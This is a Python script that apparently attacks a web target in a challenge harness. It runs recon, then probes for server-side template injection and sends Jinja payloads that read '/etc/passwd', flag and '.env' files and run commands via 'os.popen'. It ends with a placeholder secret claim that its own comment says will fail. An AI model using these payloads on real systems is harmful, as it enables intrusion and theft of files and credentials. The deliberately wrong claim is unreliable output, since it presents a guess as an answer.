import sys, json, base64, re, time
def http(method, path, body=None, body_hex=None, headers=None):
    req={"http":{"method":method,"path":path}}
    if body is not None:
        req["http"]["body"]=body
    if body_hex is not None:
        req["http"]["body_hex"]=body_hex
    if headers is not None:
        req["http"]["headers"]=headers
    sys.stdout.write(json.dumps(req)+"\n")
    sys.stdout.flush()
    line=sys.stdin.readline()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception as e:
        print(f"bad reply: {line[:500]}", file=sys.stderr, flush=True)
        return None
def txt(reply):
    if reply is None:
        return "<no reply>"
    try:
        b=base64.b64decode(reply.get("body_b64",""))
        return b.decode(errors="replace")
    except Exception as e:
        return f"<dec err {e}>"
def log(*a):
    print(*a, file=sys.stderr, flush=True)
# 1. basic recon
r=http("GET","/")
log("GET / status", r.get("status") if r else None, "ct", r.get("content_type") if r else None)
body0=txt(r)
log("GET / body snippet:", body0[:4000])
for p in ["/robots.txt","/openapi.json","/swagger.json","/health","/version","/console"]:
    rr=http("GET",p)
    log(p, rr.get("status") if rr else None, txt(rr)[:1000] if rr else "")
# SSTI probe via query params on /
probes=["{{7*7}}","${7*7}","#{7*7}","*{7*7}","<%= 7*7 %>"]
params=["name","q","input","template","content","text","msg","message","user","search","query","s","t","tpl","data"]
found=None
for pr in probes:
    for pm in ["name","q","template","input"]:
        import urllib.parse as up
        path="/?"+pm+"="+up.quote(pr, safe="")
        rr=http("GET",path)
        t=txt(rr)
        log(f"probe GET {path} => {rr.get('status') if rr else None} contains49={('49' in t)} snippet:", t[:1500])
        if "49" in t and pr in ["{{7*7}}","${7*7}"]:
            found=(pm,pr,t)
            # don't break, keep logging a bit
    # also path-based
    rr=http("GET","/"+probes[0] if False else "/hello?name="+__import__('urllib.parse').quote(pr, safe=""))
    t=txt(rr)
    log(f"probe /hello?name={pr} =>", t[:1500])
# try POST render endpoints with template injection
post_targets=["/","/render","/template","/preview","/view","/hello","/greet","/echo","/reflect","/test","/api/render"]
for tgt in post_targets:
    for payload in ["{{7*7}}","${7*7}"]:
        # form
        rr=http("POST",tgt,body=f"name={payload}&template={payload}&input={payload}",headers={"Content-Type":"application/x-www-form-urlencoded"})
        t=txt(rr)
        has49="49" in t
        log(f"POST form {tgt} payload {payload} status {rr.get('status') if rr else None} 49={has49} snippet:", t[:1500])
        # json
        rr2=http("POST",tgt,body=json.dumps({"name":payload,"template":payload,"input":payload,"content":payload}),headers={"Content-Type":"application/json"})
        t2=txt(rr2)
        log(f"POST json {tgt} payload {payload} status {rr2.get('status') if rr2 else None} 49={'49' in t2} snippet:", t2[:1500])
# Try direct SSTI RCE/file-read if any 49 found, else still try file read on most promising reflection point
# Determine best reflection endpoint: use /?name= and POST /render etc.
# Attempt Jinja file read payloads via GET param name and POST template
jinja_read_payloads=["{{ open('/etc/passwd').read() }}","{{ open('/secret').read() }}","{{ open('/flag').read() }}","{{ open('/secret.txt').read() }}","{{ open('/flag.txt').read() }}","{{ open('/app/secret').read() }}"]
cmd_payloads=["{{ cycler.__init__.__globals__.os.popen('id').read() }}","{{ joiner.__init__.__globals__.os.popen('id').read() }}","{{ namespace.__init__.__globals__.os.popen('id').read() }}","{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}","{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"]
import urllib.parse as up
secret_hex=None
def looks_like_secret_output(t):
    # return candidate hex if found
    return None
# try GET-based file read on / and /hello etc
bases=["/","/hello","/greet","/render","/template"]
for b in bases:
    for pl in jinja_read_payloads+cmd_payloads:
        path=b+"?name="+up.quote(pl, safe="")
        rr=http("GET",path)
        t=txt(rr)
        log(f"GET RCE try {b} {pl[:40]} => status {rr.get('status') if rr else None} snippet:", t[:2500])
        if "root:" in t or "uid=" in t or "SECRET" in t or len(t.strip())>0:
            pass
# try POST-based
for tgt in ["/","/render","/template","/hello","/greet"]:
    for pl in jinja_read_payloads+cmd_payloads:
        rr=http("POST",tgt,body=f"name={up.quote(pl,safe='')}&template={up.quote(pl,safe='')}",headers={"Content-Type":"application/x-www-form-urlencoded"})
        t=txt(rr)
        log(f"POST RCE try {tgt} {pl[:40]} =>", t[:2500])
        rr2=http("POST",tgt,body=json.dumps({"name":pl,"template":pl}),headers={"Content-Type":"application/json"})
        t2=txt(rr2)
        log(f"POST json RCE try {tgt} {pl[:40]} =>", t2[:2500])
# fallback: try pickle/deserialization endpoints quickly
import pickle, os
# don't log pickle locally; try sending pickle payloads to common endpoints
# simple RCE pickle that runs 'id' and embeds output? pickle can't easily return output over http unless app reflects. Try classic: check if endpoint unpickles cookie
# probe cookie reflection
rr=http("GET","/",headers={"Cookie":"session=test"})
log("cookie test", txt(rr)[:1000])
# If nothing found, dummy claim (will fail, but we get logs)
# Try to guess secret via direct paths (maybe static file?)
for p in ["/secret","/flag","/SECRET","/flag.txt","/secret.txt","/.env","/env"]:
    rr=http("GET",p)
    log(f"direct {p} => {rr.get('status') if rr else None} ", txt(rr)[:2000])
print("CLAIM:"+json.dumps({"secret_hex":"00"}))